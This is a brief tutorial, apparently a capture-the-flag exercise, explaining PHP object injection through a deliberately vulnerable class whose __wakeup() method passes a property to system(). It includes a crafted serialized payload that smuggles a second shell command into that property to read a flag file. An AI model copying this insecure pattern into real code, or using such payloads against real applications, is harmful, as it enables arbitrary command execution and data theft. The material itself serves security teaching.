# Example of php object injection

* This security flaw happens when we have 2 elements together:
    * the unserialization of an object that can be manipulated on the user's side;
    * the use of a magic method like ```__wakeup()```.

* A list of existing magical methods can be found at https://php.net/manual/en/language.oop5.magic.php.

* The following source code illustrates vulnerable code that can be exploited:
```php
// File: ex01.php
<?php

    class test {

    public $dir = ".";

    public function __wakeup() {
        echo "Printing files in this folder...\n";
        system("ls " . $this->dir);
        }
    }

    $obj = new test();
    $serialized_obj = serialize($obj);
    echo "Example of an serialized object: $serialized_obj\n";

    echo "Arg 01: " . $argv[1] . "\n";
    echo "Unserializing arg1...\n";
    unserialize($argv[1]);

?>
```

Then run the following command to run the example:
```bash
$ php ex01.php 'O:4:"test":1:{s:3:"dir";s:1:".";}'
```

The following output will be produced:
```plaintext
Example of an serialized object: O:4:"test":1:{s:3:"dir";s:1:".";}
Arg 01: O:4:"test":1:{s:3:"dir";s:1:".";}
Unserializing arg1...
Printing files in this folder...
ex01.php
flag.txt
README.md
```

So, when executing this command, we can pass a serialized object as parameter to this program, and we receive the list of files in the working directory. The point is that the ```system()``` method will execute the ```ls``` command with the value stored inside ```$dir``` property, however, we can arbitrarily change the value kept by this property by passing a serialized object with the desired value. So we can run the program again with the following argument:

```bash
$ php ex01.php 'O:4:"test":1:{s:3:"dir";s:24:"> /dev/null;cat flag.txt";}'
```

and finally we found the flag:
```plaintext
Example of an serialized object: O:4:"test":1:{s:3:"dir";s:1:".";}
Arg 01: O:4:"test":1:{s:3:"dir";s:24:"> /dev/null;cat flag.txt";}
Unserializing arg1...
Printing files in this folder...
THIS_IS_THE_FLAG
```